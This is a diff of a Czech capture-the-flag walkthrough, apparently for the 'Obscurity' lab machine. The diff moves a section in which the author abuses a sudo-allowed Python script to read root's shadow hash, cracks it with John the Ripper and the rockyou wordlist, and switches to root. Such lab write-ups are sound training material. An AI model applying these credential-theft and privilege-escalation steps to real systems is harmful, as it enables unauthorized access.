@@ -67,6 +67,23 @@ SF:sk-spinner\x20sk-spinner-wordpress\">\n");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+## Analýza zjištění
+
+### Lámání hesel nebo hashů
+
+Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
+```bash
+sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+```
+```
+root:$6$riekpK4m$__CENSORED__:18226:0:99999:7
+
+/usr/sbin/john Obscurity-shadow --wordlist=/usr/share/wordlists/rockyou.txt
+=>mercedes         (root)
+
+su root
+```
+
 ## Získání přístupu
 
 ### Přihlášení na cíl (2)
@@ -86,23 +103,6 @@ cat user.txt
 __CENSORED__
 
 =>sudo -l => (ALL) NOPASSWD: __CENSORED__ /home/robert/BetterSSH/BetterSSH.py
-```
-
-## Analýza zjištění
-
-### Lámání hesel nebo hashů
-
-Hash nebo zašifrovaný artefakt má smysl lámat jen tehdy, pokud může otevřít další službu, účet nebo vrstvu prostředí; právě to zde ověřuji.
-```bash
-sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-```
-```
-root:$6$riekpK4m$__CENSORED__:18226:0:99999:7
-
-/usr/sbin/john Obscurity-shadow --wordlist=/usr/share/wordlists/rockyou.txt
-=>mercedes         (root)
-
-su root
 ```
 
 ## Eskalace oprávnění
